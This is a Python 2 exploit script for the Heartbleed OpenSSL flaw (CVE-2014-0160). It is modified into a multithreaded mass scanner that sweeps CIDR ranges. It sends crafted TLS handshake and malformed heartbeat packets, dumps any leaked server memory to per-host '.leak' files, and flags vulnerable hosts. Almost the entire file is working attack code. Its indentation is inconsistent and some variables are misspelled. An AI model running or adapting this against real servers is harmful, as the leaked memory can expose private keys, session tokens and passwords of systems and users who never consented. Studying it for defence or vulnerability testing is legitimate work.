
# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
# Mass scanning mod using CIDR notation added by Hacker Fantastic.
import sys
import struct
import socket
import time
import select
import re
import socket 
import struct
import threading
import time
import Queue
import sys, re
from optparse import OptionParser

THREADS = 100
scanPool = Queue.Queue(0)

options = OptionParser(usage='%prog IP-range [options]', description='Mass-scanner for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
port = 443

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')

def hexdump(s,host):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        filename = "%s-%d.leak" % (host,port)
	file = open(filename,'a')
	file.write('  %04x: %-48s %s\n' % (b, hxdat, pdat))
	file.close()

class Scanner(threading.Thread):
    def run(self):
	socket.setdefaulttimeout(3)
	while True:
		sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host = scanPool.get()
            	try:
        	        sd.connect((host, port))
            	except socket.error:
			print "%s:%d:CLOSED" % (host, port)
           	else:
			#error handling isnt brilliant here. can throw exception.
			try:
				vulnerable = ""
    				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    				sys.stdout.flush()
    				s.connect((host, port))
    				s.send(hello)
    				while True:
        				typ, ver, pay = recvmsg(s)
        				if typ == None:
            					return
        				# Look for server hello done message.
        				if typ == 22 and ord(pay[0]) == 0x0E:
            					break
    				s.send(hb)
  				hit_hb(s,host,port)
			except socket.error:
				vlunerable = ""
               		sd.close()
		scanPool.task_done()
		
def ip2bin(ip):
    b = ""
    inQuads = ip.split(".")
    outQuads = 4
    for q in inQuads:
        if q != "":
            b += dec2bin(int(q),8)
            outQuads -= 1
    while outQuads > 0:
        b += "00000000"
        outQuads -= 1
    return b

def dec2bin(n,d=None):
    s = ""
    while n>0:
        if n&1:
            s = "1"+s
        else:
            s = "0"+s
        n >>= 1
    if d is not None:
        while len(s)<d:
            s = "0"+s
    if s == "": s = "0"
    return s

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

def bin2ip(b):
    ip = ""
    for i in range(0,len(b),8):
        ip += str(int(b[i:i+8],2))+"."
    return ip[:-1]

def scanCIDR(c):
    	parts = c.split("/")
    	baseIP = ip2bin(parts[0])
    	subnet = int(parts[1])
    	if subnet == 32:
		Scanner().start()
    		scanPool.put(bin2ip(baseIP))
		scanPool.join()
		print "Done."
		quit()
    	else:
		for x in xrange(THREADS):
			Scanner().start()
    		ipPrefix = baseIP[:-(32-subnet)]
    		for i in range(2**(32-subnet)):
    			scanPool.put(bin2ip(ipPrefix+dec2bin(i, (32-subnet))))
		scanPool.join()
		print "Done."
		quit()

def validateCIDRBlock(b):
    p = re.compile("^([0-9]{1,3}\.){0,3}[0-9]{1,3}(/[0-9]{1,2}){1}$")
    if not p.match(b):
        print "Error: Invalid CIDR format!"
        return False
    prefix, subnet = b.split("/")
    quads = prefix.split(".")
    for q in quads:
        if (int(q) < 0) or (int(q) > 255):
            print "Error: quad "+str(q)+" wrong size."
            return False
    if (int(subnet) < 1) or (int(subnet) > 32):
        print "Error: subnet "+str(subnet)+" wrong size."
        return False
    return True

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        return None, None, None
    return typ, ver, pay

def hit_hb(s,host,port):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
	    print "%s:%d:OPEN:" % (host,port)
            return False

        if typ == 24:
            hexdump(pay,host)
            if len(pay) > 3:
		print "%s:%d:OPEN:VULNERABLE" % (host,port)
            else:
		a = 1
		print "%s:%d:OPEN:" % (host,port)
            return True

        if typ == 21:
            hexdump(pay,host)
            return False


def printUsage():
    print "Use the force."

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
    cidrBlock = args[0]
    if not validateCIDRBlock(cidrBlock):
        printUsage()
    else:
        scanCIDR(cidrBlock)

if __name__ == "__main__":
	main()
